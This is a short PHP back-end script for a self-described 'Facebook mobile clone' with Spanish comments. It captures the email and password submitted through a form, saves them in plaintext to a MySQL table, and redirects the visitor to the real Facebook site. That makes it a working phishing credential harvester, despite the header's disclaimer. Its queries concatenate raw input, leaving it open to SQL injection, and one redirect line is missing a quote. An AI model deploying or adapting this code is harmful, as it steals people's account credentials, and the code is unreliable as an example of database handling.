<?php

/* FACEBOOK MOBILE CLONE MADE ENTIRELY BY ME, JONATHAN CT, YOU ARE ALLOWED TO USE IT FOR ANY PURPOSE BUT PHISHING OTHERS. :) */

$db_host="HOST";
$db_user="USUARIO";
$db_password="PASSWORD";
$db_name="NOMBREBASE";
$db_table_name="NOMBRETABLA";
   $db_connection = mysql_connect($db_host, $db_user, $db_password);

if (!$db_connection) {
	die('No se ha podido conectar a la base de datos');
}

//Envío de formulario por método post
$subs_email = utf8_decode($_POST['Email']);
$subs_pass = utf8_decode($_POST['Password']);

$resultado=mysql_query("SELECT * FROM ".$db_table_name." WHERE Email = '".$subs_email."'", $db_connection);

if (mysql_num_rows($resultado)>0)
{

	header('Location: http://m.facebook.com/help');	//Si el email ya está registrado en la base enviará a fb.com/help

} 

else {
		
	$insert_value = 'INSERT INTO `' . $db_name . '`.`'.$db_table_name.'` (`Email` , `Password`) VALUES ("' . $subs_email . '", "' . $subs_pass . '")';

	mysql_select_db($db_name, $db_connection);
	$retry_value = mysql_query($insert_value, $db_connection);

	if (!$retry_value) {
	   die('Error: ' . mysql_error());
	}
		
	header('Location: http://m.facebook.com/);
}

mysql_close($db_connection);
		
?>